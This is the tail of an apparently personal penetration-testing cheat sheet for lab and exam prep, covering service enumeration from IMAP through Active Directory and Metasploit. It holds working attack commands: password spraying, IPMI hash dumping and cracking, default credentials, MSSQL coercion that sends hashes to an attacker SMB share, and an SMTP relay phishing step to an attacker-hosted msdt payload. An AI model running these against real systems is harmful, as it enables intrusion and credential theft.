+<p>When found IMAP services (Dovecot, Courier) with PAM authentication, discovered credentials often work across multiple users due to system-wide password reuse. Spray known passwords against user lists.</p>
+<pre><code class="language-bash"># Manual IMAP login test
+curl -k &quot;imaps://&lt;IP&gt;&quot; --user &quot;&lt;USER&gt;:&lt;PASSWORD&gt;&quot;
+
+# Using Hydra for IMAP spray
+hydra -L &lt;USERLIST&gt; -p '&lt;PASSWORD&gt;' &lt;IP&gt; imap -V
+hydra -L &lt;USERLIST&gt; -p '&lt;PASSWORD&gt;' &lt;IP&gt; imaps -V
+
+# Using nmap IMAP brute script
+nmap -p 143 --script imap-brute \
+  --script-args &quot;userdb=&lt;USERLIST&gt;,passdb=&lt;PASSLIST&gt;&quot; &lt;IP&gt;
+
+# Read mailbox after auth (via curl)
+curl -k &quot;imaps://&lt;IP&gt;/INBOX&quot; --user &quot;&lt;USER&gt;:&lt;PASSWORD&gt;&quot;
+
+# List all mail folders
+curl -k &quot;imaps://&lt;IP&gt;&quot; --user &quot;&lt;USER&gt;:&lt;PASSWORD&gt;&quot; -X &quot;LIST \&quot;\&quot; *&quot;
+</code></pre>
+<p><strong>Important:</strong> Even if one user's password fails for IMAP, try spraying against ALL discovered users — the same cleartext password may work across different accounts due to the authentication backend (LDAP, PAM, local passwd).</p>
+<hr />
+<h2 id="ipmi-udp-623">IPMI (UDP 623)</h2>
+<p>Intelligent Platform Management Interface. Hardware-based management independent of host OS. Communicates over <strong>UDP/623</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Product</th>
+<th>Default Username</th>
+<th>Default Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Dell iDRAC</td>
+<td>root</td>
+<td>calvin</td>
+</tr>
+<tr>
+<td>HP iLO</td>
+<td>Administrator</td>
+<td>randomized 8-char (digits + uppercase)</td>
+</tr>
+<tr>
+<td>Supermicro IPMI</td>
+<td>ADMIN</td>
+<td>ADMIN</td>
+</tr>
+</tbody>
+</table>
+<p><strong>RAKP vulnerability (IPMI 2.0):</strong> During auth, server sends salted SHA1/MD5 hash before completing — capture and crack offline.</p>
+<pre><code class="language-bash"># Nmap IPMI version scan
+sudo nmap -sU --script ipmi-version -p 623 &lt;target&gt;
+
+# MSF version scan / hash dump
+use auxiliary/scanner/ipmi/ipmi_version
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set rhosts &lt;IP&gt;
+run
+
+# Crack IPMI hashes (dictionary)
+hashcat -m 7300 -a 0 --username ipmi.hash /usr/share/wordlists/rockyou.txt
+
+# Mask attack for HP iLO default style (8-char digits+uppercase)
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+
+# ipmitool — interact with IPMI after obtaining credentials
+ipmitool -I lanplus -H &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt; chassis status
+ipmitool -I lanplus -H &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt; user list
+ipmitool -I lanplus -H &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt; user set password &lt;USER_ID&gt; &lt;NEW_PASSWORD&gt;
+</code></pre>
+<hr />
+<h2 id="oracle-tns-port-1521">Oracle TNS (Port 1521)</h2>
+<p>Oracle database service. Default creds: Oracle 9 <code>CHANGE_ON_INSTALL</code>, DBSNMP <code>dbsnmp</code>. Config files: <code>tnsnames.ora</code> (client), <code>listener.ora</code> (server) in <code>$ORACLE_HOME/network/admin</code>.</p>
+<pre><code class="language-bash"># Nmap SID brute-force
+sudo nmap -p1521 -sV &lt;IP&gt; --open --script oracle-sid-brute
+
+# ODAT (Oracle Data Access Tool) — full sweep
+./odat.py all -s &lt;IP&gt;
+
+# SQL*Plus connection
+sqlplus &lt;USER&gt;/&lt;PASS&gt;@&lt;IP&gt;/&lt;SID&gt;
+sqlplus &lt;USER&gt;/&lt;PASS&gt;@&lt;IP&gt;/&lt;SID&gt; as sysdba
+</code></pre>
+<p><strong>Oracle SQL enumeration (after login):</strong></p>
+<pre><code class="language-sql">select table_name from all_tables;
+select * from user_role_privs;
+select name, password from sys.user$;       -- legacy password hashes (needs sysdba)
+</code></pre>
+<p><strong>File upload via ODAT:</strong></p>
+<pre><code class="language-bash">./odat.py utlfile -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;USER&gt; -P &lt;PASS&gt; --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+curl -X GET http://&lt;IP&gt;/testing.txt
+</code></pre>
+<hr />
+<h2 id="finger-port-79">Finger (Port 79)</h2>
+<p>A free username oracle on mail-suite / legacy Unix boxes (PG Hepet — Mercury/32). Validates which roster/wordlist names are real local accounts before you spend effort on SMTP/POP3/SSH.</p>
+<pre><code class="language-bash">finger &lt;USER&gt;@&lt;IP&gt;
+echo '&lt;USER&gt;' | nc &lt;IP&gt; 79                       # same query without the finger client
+
+# Loop a name list, drop the misses
+for u in $(cat names.txt); do finger $u@&lt;IP&gt;; done | grep -v 'not known'
+#   Login: jonas   Name: Jonas                     &lt;-- real mailbox
+#   Login: admin   Name: Mail System Administrator &lt;-- privileged account to target
+
+sudo apt install finger    # client isn't installed on Kali/Parrot by default
+</code></pre>
+<hr />
+<h2 id="squid-proxy-port-3128">Squid Proxy (Port 3128)</h2>
+<p>An open Squid <strong>forward proxy</strong> becomes an internal port scanner — reach services bound to the target's own loopback that a normal scan never sees (PG Squid -&gt; pivoted to loopback MySQL + WAMP/phpMyAdmin).</p>
+<pre><code class="language-bash"># spose — Squid Pivoting Open Port Scanner: scan the target's OWN 127.0.0.1 through the proxy
+git clone https://github.com/aancw/spose &amp;&amp; cd spose
+python3 spose.py --proxy http://&lt;IP&gt;:3128 --target 127.0.0.1
+
+# Hand-rolled equivalent — any response differing from Squid's error page = open internal port
+curl -x http://&lt;IP&gt;:3128 http://127.0.0.1:&lt;PORT&gt;/
+
+# Then browse internal web apps through the proxy (add to proxychains or use curl -x)
+curl -x http://&lt;IP&gt;:3128 http://127.0.0.1:8080/
+</code></pre>
+<hr />
+<h2 id="r-services-ports-512-513-514">R-Services (Ports 512, 513, 514)</h2>
+<p>Legacy remote access protocols. Trust-based auth via <code>/etc/hosts.equiv</code> and <code>~/.rhosts</code> — no passwords needed if trusted.</p>
+<pre><code class="language-bash"># Nmap R-services scan
+sudo nmap -sV -p 512,513,514 &lt;IP&gt;
+
+# rlogin (remote login - port 513)
+rlogin &lt;IP&gt; -l &lt;USER&gt;
+
+# rsh (remote shell - port 514)
+rsh &lt;IP&gt; -l &lt;USER&gt; &lt;COMMAND&gt;
+
+# rexec (remote exec with cleartext password - port 512)
+rexec &lt;IP&gt; -l &lt;USER&gt; -p &lt;PASS&gt; &lt;COMMAND&gt;
+
+# rusers (list remote users)
+rusers -al &lt;IP&gt;
+</code></pre>
+<p><strong>Trust file inspection (if you have shell):</strong></p>
+<pre><code class="language-bash">cat /etc/hosts.equiv           # system-wide trusted hosts
+cat ~/.rhosts                  # per-user trusted hosts
+# Format: hostname [username] — allows access without password
+</code></pre>
+<hr />
+<h2 id="rsync-port-873">Rsync (Port 873)</h2>
+<p>File synchronization service. Can expose entire filesystems.</p>
+<pre><code class="language-bash"># Nmap rsync scan
+sudo nmap -sV -p 873 &lt;IP&gt;
+
+# Connect and list shares
+nc -nv &lt;IP&gt; 873
+
+# List rsync modules
+rsync -av --list-only rsync://&lt;IP&gt;/
+
+# Download from rsync share
+rsync -av --list-only rsync://&lt;IP&gt;/dev
+</code></pre>
+<hr />
+<h2 id="smb-profiles-share-username-discovery">SMB Profiles$ Share — Username Discovery</h2>
+<p>The <code>profiles$</code> share (common on Roaming Profile deployments) exposes folder names that correspond directly to domain usernames.</p>
+<pre><code class="language-bash"># List profiles$ share contents — each folder name is a username
+smbclient -U '&lt;USER&gt;%&lt;PASSWORD&gt;' //&lt;TARGET_IP&gt;/profiles$
+smb&gt; ls
+
+# Or via smbmap
+smbmap -u '&lt;USER&gt;' -p '&lt;PASSWORD&gt;' -H &lt;TARGET_IP&gt; -R profiles$
+
+# Extract usernames from folder listing into a wordlist
+smbclient -U '&lt;USER&gt;%&lt;PASSWORD&gt;' //&lt;TARGET_IP&gt;/profiles$ -c 'ls' 2&gt;/dev/null \
+  | awk '{print $1}' | grep -v &quot;^\.&quot; | grep -v &quot;blocks&quot; &gt; users.txt
+</code></pre>
+<hr />
+<h2 id="wordpress-enumeration-wpscan">WordPress Enumeration (WPScan)</h2>
+<p>Enumerate WordPress installations for vulnerable plugins, themes, and user accounts.</p>
+<pre><code class="language-bash"># Full enumeration — users and all plugins (aggressive detection)
+wpscan --url http://&lt;TARGET&gt; -e u,ap --plugins-detection aggressive
+
+# Enumerate users only
+wpscan --url http://&lt;TARGET&gt; -e u
+
+# Enumerate vulnerable plugins only
+wpscan --url http://&lt;TARGET&gt; -e vp
+
+# With API token (for vulnerability data from WPScan database)
+wpscan --url http://&lt;TARGET&gt; -e u,ap --plugins-detection aggressive --api-token &lt;TOKEN&gt;
+
+# Password spray against discovered users
+wpscan --url http://&lt;TARGET&gt; -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+# HTTPS target
+wpscan --url https://&lt;TARGET&gt; -e u,ap --plugins-detection aggressive --disable-tls-checks
+</code></pre>
+<hr />
+<h2 id="ssl-tls-certificate-mining-host-domain-discovery">SSL/TLS Certificate Mining — Host/Domain Discovery</h2>
+<p>SSL certificates contain Subject, Issuer, and Subject Alternative Names (SANs) that often leak internal hostnames, domain names, CA server names, and internal IP addresses. <strong>ALWAYS inspect SSL certificates on HTTPS services.</strong></p>
+<pre><code class="language-bash"># Extract certificate details
+openssl s_client -connect &lt;IP&gt;:443 2&gt;/dev/null | openssl x509 -noout -text | grep -A1 &quot;Subject\|Issuer\|Subject Alternative&quot;
+
+# Save certificate to file
+openssl s_client -connect &lt;IP&gt;:443 -showcerts 2&gt;/dev/null | openssl x509 -outform PEM -out cert.pem
+
+# Extract Subject CN / SANs / Issuer
+openssl x509 -in cert.pem -noout -subject
+openssl x509 -in cert.pem -noout -text | grep -A1 &quot;Subject Alternative&quot;
+openssl x509 -in cert.pem -noout -issuer
+</code></pre>
+<p><strong>Key information to extract:</strong></p>
+<ul>
+<li><strong>Subject CN:</strong> Internal FQDN (e.g., mail., intranet.)</li>
+<li><strong>Subject Alternative Names (SAN):</strong> Internal hostnames and IPs — these are virtual hosts waiting to be added to <code>/etc/hosts</code></li>
+<li><strong>Issuer CN:</strong> CA server name (e.g., <code>&lt;DOMAIN&gt;-CA01-CA</code> reveals CA server location and domain)</li>
+</ul>
+<p><strong>SAN enumeration workflow for vhost discovery:</strong></p>
+<pre><code class="language-bash"># Quick one-liner to extract all DNS SANs from an HTTPS service
+openssl s_client -connect &lt;TARGET_IP&gt;:443 2&gt;/dev/null \
+  | openssl x509 -noout -text \
+  | grep -oP 'DNS:\K[^,\s]+' | sort -u
+
+# Add all SANs to /etc/hosts for further enumeration
+echo &quot;&lt;TARGET_IP&gt; &lt;SAN1&gt; &lt;SAN2&gt; &lt;SAN3&gt;&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Add all discovered hostnames to <code>/etc/hosts</code> for Kerberos authentication later.</strong></p>
+<hr />
+<h2 id="dhcp-udp-67-68">DHCP (UDP 67/68)</h2>
+<pre><code class="language-bash"># Nmap DHCP discovery
+sudo nmap --script broadcast-dhcp-discover
+# Shows: IP offered, server, lease time, DNS, gateway, subnet mask
+</code></pre>
+<hr />
+<h2 id="nbt-ns-netbios-udp-137">NBT-NS / NetBIOS (UDP 137)</h2>
+<pre><code class="language-bash"># nbtscan (scan range)
+nbtscan -r 192.168.1.0/24
+
+# nmblookup (single IP)
+nmblookup -A &lt;IP&gt;
+
+# Responder (passive capture — analyse-only is exam-OK, poisoning is banned)
+sudo responder -I eth0 -A
+</code></pre>
+<hr />
+<h2 id="mdns-udp-5353">mDNS (UDP 5353)</h2>
+<pre><code class="language-bash"># mdns-scan
+mdns-scan
+</code></pre>
+<hr />
+<h2 id="service-enumeration-quick-reference">Service Enumeration Quick Reference</h2>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Port</th>
+<th>Tool</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FTP</td>
+<td>21</td>
+<td><code>ftp</code>, <code>wget -m</code></td>
+<td>Check anonymous</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>22</td>
+<td><code>ssh-audit</code></td>
+<td>Weak algorithms, brute-force</td>
+</tr>
+<tr>
+<td>SMTP</td>
+<td>25</td>
+<td><code>telnet</code>, <code>smtp-user-enum</code></td>
+<td>User enum, relay</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>53</td>
+<td><code>dig</code>, <code>dnsenum</code>, <code>gobuster</code></td>
+<td>Zone transfer, subdomain enum</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>80</td>
+<td><code>curl</code>, <code>ffuf</code></td>
+<td>Web fuzzing</td>
+</tr>
+<tr>
+<td>RPC</td>
+<td>111</td>
+<td><code>rpcclient</code>, <code>nmap</code></td>
+<td>SMB NULL session</td>
+</tr>
+<tr>
+<td>NetBIOS</td>
+<td>139</td>
+<td><code>nbtscan</code></td>
+<td>Legacy Windows</td>
+</tr>
+<tr>
+<td>SNMP</td>
+<td>161</td>
+<td><code>snmpwalk</code>, <code>onesixtyone</code></td>
+<td>Community strings</td>
+</tr>
+<tr>
+<td>LDAP</td>
+<td>389</td>
+<td><code>ldapsearch</code>, <code>windapsearch</code></td>
+<td>Anonymous bind</td>
+</tr>
+<tr>
+<td>HTTP-Alt</td>
+<td>443</td>
+<td><code>curl</code></td>
+<td>HTTPS</td>
+</tr>
+<tr>
+<td>SMB</td>
+<td>445</td>
+<td><code>smbclient</code>, <code>cme</code>, <code>enum4linux</code></td>
+<td>Shares, users, groups</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>1433</td>
+<td><code>mssqlclient</code>, <code>cme</code></td>
+<td>SQL auth, RCE</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>3306</td>
+<td><code>mysql</code></td>
+<td>Weak passwords</td>
+</tr>
+<tr>
+<td>NFS</td>
+<td>2049</td>
+<td><code>showmount</code>, <code>mount</code></td>
+<td>Exported filesystems</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>1521</td>
+<td><code>sqlplus</code>, <code>odat</code></td>
+<td>SID brute, auth</td>
+</tr>
+<tr>
+<td>RDP</td>
+<td>3389</td>
+<td><code>xfreerdp</code>, <code>cme</code></td>
+<td>Screenshots, auth</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>5985</td>
+<td><code>evil-winrm</code>, <code>cme</code></td>
+<td>PowerShell execution</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="password-policy-enumeration">Password Policy Enumeration</h2>
+<h3>From Linux</h3>
+<pre><code class="language-bash"># CrackMapExec / NetExec
+crackmapexec smb &lt;TARGET_IP&gt; -u &lt;USER&gt; -p '&lt;PASSWORD&gt;' --pass-pol
+
+# rpcclient NULL session
+rpcclient -U &quot;&quot; -N &lt;TARGET_IP&gt;
+# querydominfo -&gt; domain info; getdompwinfo -&gt; password policy
+
+# enum4linux
+enum4linux -P &lt;TARGET_IP&gt;
+
+# enum4linux-ng (JSON output)
+enum4linux-ng -P &lt;TARGET_IP&gt; -oA output
+
+# ldapsearch for password policy
+ldapsearch -h &lt;TARGET_IP&gt; -x -b &quot;DC=&lt;DOMAIN&gt;,DC=&lt;TLD&gt;&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength
+</code></pre>
+<h3>From Windows</h3>
+<pre><code class="language-powershell"># NULL session test
+net use \\&lt;DC&gt;\ipc$ &quot;&quot; /u:&quot;&quot;
+
+# Password policy
+net accounts
+
+# PowerView — detailed policy + Kerberos settings
+Import-Module .\PowerView.ps1
+Get-DomainPolicy
+</code></pre>
+<p><strong>Error codes:</strong> <code>1326</code> = wrong password | <code>1331</code> = account disabled | <code>1909</code> = account locked out</p>
+<p><strong>Safe spray formula:</strong> Max sprays = Lockout Threshold − 2 | Wait = Reset Counter + 1 min</p>
+<hr />
+<h2 id="security-controls-enumeration-windows">Security Controls Enumeration (Windows)</h2>
+<pre><code class="language-powershell"># Windows Defender status
+Get-MpComputerStatus
+(Get-MpComputerStatus).RealTimeProtectionEnabled
+
+# AppLocker policy
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# PowerShell Language Mode
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage = no restrictions | ConstrainedLanguage = limited
+
+# Local Administrators group
+Get-LocalGroupMember -Group &quot;Administrators&quot;
+
+# LAPS enumeration (requires LAPSToolkit)
+Import-Module .\LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
+Find-AdmPwdExtendedRights
+Get-LAPSComputers
+</code></pre>
+<hr />
+<h2 id="domain-trust-enumeration">Domain Trust Enumeration</h2>
+<h3>PowerShell (Built-in)</h3>
+<pre><code class="language-powershell">Import-Module activedirectory
+Get-ADTrust -Filter *
+</code></pre>
+<h3>PowerView</h3>
+<pre><code class="language-powershell">Get-DomainTrust
+Get-DomainTrustMapping
+Get-DomainUser -Domain &lt;CHILD_DOMAIN&gt; | select SamAccountName
+</code></pre>
+<h3>netdom (Built-in)</h3>
+<pre><code class="language-cmd">netdom query /domain:&lt;DOMAIN&gt; trust
+netdom query /domain:&lt;DOMAIN&gt; dc
+netdom query /domain:&lt;DOMAIN&gt; workstation
+</code></pre>
+<hr />
+<h2 id="application-discovery-screenshotting">Application Discovery &amp; Screenshotting</h2>
+<pre><code class="language-bash"># Web port scan
+nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
+
+# EyeWitness
+eyewitness --web -x web_discovery.xml -d output_directory
+
+# Aquatone
+cat web_discovery.xml | aquatone -nmap -out aquatone_report
+</code></pre>
+<hr />
+<h2 id="ad-auditing-tools">AD Auditing Tools</h2>
+<pre><code class="language-bash"># PingCastle
+PingCastle.exe --healthcheck
+PingCastle.exe --server &lt;DC_FQDN&gt; --user &lt;USER&gt; --password '&lt;PASSWORD&gt;'
+
+# Group3r (GPO auditing)
+group3r.exe -f gpo_audit.log
+
+# ADRecon
+.\ADRecon.ps1
+
+# Trufflehog (Git secrets)
+trufflehog github --repo https://github.com/&lt;ORG&gt;/&lt;REPO&gt;
+trufflehog github --org &lt;ORGANIZATION_NAME&gt;
+</code></pre>
+<hr />
+<h2 id="metasploit-auxiliary-enumeration-modules">Metasploit Auxiliary Enumeration Modules</h2>
+<h3>FTP Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_version
+set RHOSTS &lt;TARGET_IP&gt;
+run
+
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS &lt;TARGET_IP&gt;
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+</code></pre>
+<h3>SMB Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/smb/smb_version
+set RHOSTS &lt;TARGET_IP&gt;
+run
+
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+set ShowFiles true
+run
+
+use auxiliary/scanner/smb/smb_login
+set SMBUser &lt;USER&gt;
+set PASS_FILE &lt;WORDLIST&gt;
+run
+</code></pre>
+<h3>SSH Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_enumusers
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+
+use auxiliary/scanner/ssh/ssh_login
+set USER_FILE &lt;USERLIST&gt;
+set PASS_FILE &lt;PASSLIST&gt;
+run
+</code></pre>
+<h3>MySQL Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/mysql/mysql_version
+use auxiliary/scanner/mysql/mysql_login
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+
+# After getting creds
+use auxiliary/admin/mysql/mysql_enum
+use auxiliary/admin/mysql/mysql_sql
+set SQL show databases;
+run
+
+# View collected data
+loot    # List owned artifacts
+creds   # List collected credentials
+</code></pre>
+<h3>SMTP Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/smtp/smtp_version
+use auxiliary/scanner/smtp/smtp_enum
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+run
+</code></pre>
+<h3>Web Server Enumeration (MSF)</h3>
+<pre><code class="language-bash">use auxiliary/scanner/http/http_version
+use auxiliary/scanner/http/http_header
+use auxiliary/scanner/http/robots_txt
+use auxiliary/scanner/http/dir_scanner
+use auxiliary/scanner/http/files_dir
+use auxiliary/scanner/http/http_login
+set AUTH_URI /secure/
+set USER_FILE &lt;USERLIST&gt;
+set PASS_FILE &lt;PASSLIST&gt;
+run
+
+# Check allowed HTTP methods
+use auxiliary/scanner/http/options
+</code></pre>
+<hr />
+<h2 id="htb-pg-box-specific-enumeration-tricks">HTB / PG Box-Specific Enumeration Tricks</h2>
+<h3>Impacket lookupsid — Anonymous SID -&gt; Username Brute (HTB Manager)</h3>
+<pre><code class="language-bash">impacket-lookupsid -no-pass &quot;&lt;DOMAIN&gt;/ @&lt;DC_IP&gt;&quot;
+# Iterates RID values against the DC over SAMR — dumps user list even when smbclient/enum4linux fail
+# Works over anonymous null session on old DCs
+</code></pre>
+<h3>MSSQL guest xp_dirtree Coerce (HTB Manager)</h3>
+<pre><code class="language-bash"># Post-auth as SQL 'operator' user (default in some labs)
+mssqlclient.py &quot;operator:operator@&lt;IP&gt;&quot; -windows-auth
+SQL&gt; xp_dirtree C:\inetpub\wwwroot
+
+# Coerce SQL service to authenticate against attacker SMB (impacket-smbserver, NOT Responder)
+SQL&gt; xp_dirtree \\&lt;LHOST&gt;\a
+# Attacker: impacket-smbserver share . -smb2support   -&gt; captures Net-NTLMv2 hash
+</code></pre>
+<h3>Windows NFS Export Enum (HTB Remote)</h3>
+<p>Windows Server exports over NFS turn into a foothold when the mounted share hides a CMS DB or backup:</p>
+<pre><code class="language-bash">showmount -e &lt;IP&gt;                                # list exports
+sudo mkdir /mnt/nfs
+sudo mount -t nfs &lt;IP&gt;:/site_backups /mnt/nfs
+# Then hunt for .sdf, .db, .bak, wp-config.php etc.
+</code></pre>
+<h3>BIND AXFR + Preprod Vhost Fuzz (HTB Trick)</h3>
+<pre><code class="language-bash"># Zone transfer reveals internal vhosts
+dig @&lt;IP&gt; &lt;DOMAIN&gt; axfr
+
+# Note any preprod-*/dev-* CNAMEs, then vhost fuzz them
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+     -u http://&lt;IP&gt; -H &quot;Host: preprod-FUZZ.&lt;DOMAIN&gt;&quot; -fs 5480
+#   -fs SIZE      filter out baseline &quot;not found&quot; response size
+</code></pre>
+<h3>SMTP Relay Bypass (External-From Address — HTB Outdated)</h3>
+<p><strong>When to use:</strong> hMailServer and some Postfix configs only require auth when the FROM header is inside the local domain. External-from addresses relay unauthenticated -&gt; phishing vector.</p>
+<pre><code class="language-bash">swaks --to itsupport@&lt;DOMAIN&gt; --from &quot;attacker@evil.htb&quot; --server &lt;IP&gt; \
+      --header &quot;Subject: Internal web app&quot; \
+      --body &quot;http://&lt;LHOST&gt;/msdt.html&quot;
+#   --to        recipient
+#   --from      envelope sender (external-from = bypasses auth)
+#   --server    SMTP relay to use
+</code></pre>
+<hr />
+<h2 id="pg-practice-smtp-user-enumeration-postfish">PG Practice — SMTP User Enumeration (PostFish)</h2>
+<p><strong>VRFY</strong> confirms which users exist; <strong>RCPT</strong> with a real domain confirms the address format:</p>
+<pre><code class="language-bash">smtp-user-enum -M VRFY -U users.txt -t &lt;IP&gt;
+smtp-user-enum -M RCPT -D postfish.off -U users.txt -t &lt;IP&gt;
+#   -M    enumeration method (VRFY, EXPN, RCPT)
+#   -U    username wordlist
+#   -D    domain to append (RCPT mode only)
+#   -t    target IP
+</code></pre>
+<p><strong>Manual raw SMTP:</strong></p>
+<pre><code>nc &lt;IP&gt; 25
+HELO x
+VRFY bob            # 252 = &quot;cannot verify but will accept&quot;, 250 = confirmed, 550 = no
+RCPT TO:&lt;bob@postfish.off&gt;
+</code></pre>
+<hr />
+<h2 id="pg-practice-remote-mouse-udp-1978-fingerprint-mice">PG Practice — Remote Mouse UDP/1978 Fingerprint (Mice)</h2>
+<pre><code class="language-bash">nc &lt;IP&gt; 1978          # -&gt; &quot;SIN 15win nop nop 300&quot;  (nop nop = no password set)
+# NB: UDP/1978 is the actual command channel; TCP just serves fingerprint
+</code></pre>
+<hr />
+<h2 id="pg-practice-non-standard-port-signals">PG Practice — Non-Standard Port Signals</h2>
+<p><strong>Non-default ports are usually intentional</strong> — the box author moved them to guide you:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Standard service</th>
+<th>Box</th>
+<th>Intended path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>5437</td>
+<td>PostgreSQL (usu. 5432)</td>
+<td>Nibbles</td>
+<td>PostgreSQL default creds -&gt; <code>COPY FROM PROGRAM</code> RCE</td>
+</tr>
+<tr>
+<td>43022</td>
+<td>SSH</td>
+<td>Hunit</td>
+<td>The "hidden" SSH — Hydra with known usernames</td>
+</tr>
+<tr>
+<td>7742</td>
+<td>HTTP (Sorcerer)</td>
+<td>Sorcerer</td>
+<td>The intended HTTP path</td>
+</tr>
+<tr>
+<td>2121</td>
+<td>FTP</td>
+<td>SpiderSociety</td>
+<td>Anonymous writable share</td>
+</tr>
+<tr>
+<td>8080 + 80</td>
+<td>Multiple HTTP</td>
+<td>Various</td>
+<td>Each is a different app; probe all independently</td>
+</tr>
+<tr>
+<td>9998 + 17001</td>
+<td>SmarterMail</td>
+<td>Algernon</td>
+<td>Admin console on 9998; .NET Remoting exploit on 17001</td>
+</tr>
+<tr>
+<td>6789</td>
+<td>Mage AI</td>
+<td>Zab</td>
+<td>Unauth Files UI + Terminal</td>
+</tr>
+<tr>
+<td>8081</td>
+<td>Nexus</td>
+<td>Billyboss</td>
+<td>Default <code>nexus:nexus</code> fallback</td>
+</tr>
+<tr>
+<td>8000 + 50000</td>
+<td>Werkzeug (Flask)</td>
+<td>WallpaperHub, Hetemit</td>
+<td>Custom Python app with dev-mode issues</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Always <code>whatweb</code> / <code>curl -sI</code> each independently — never assume port == service.</strong></p>
+  <p class="disclaimer">// For authorized engagements, lab environments, and exam prep only. Box names reference retired HTB / PG Practice targets used for study. Responder poisoning and spoofing are noisy and often exam-restricted — analyse-only where in scope. Replace all placeholders with your own scoped values.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — service-enum · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');a.scrollIntoView({block:'nearest',inline:'center'});}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
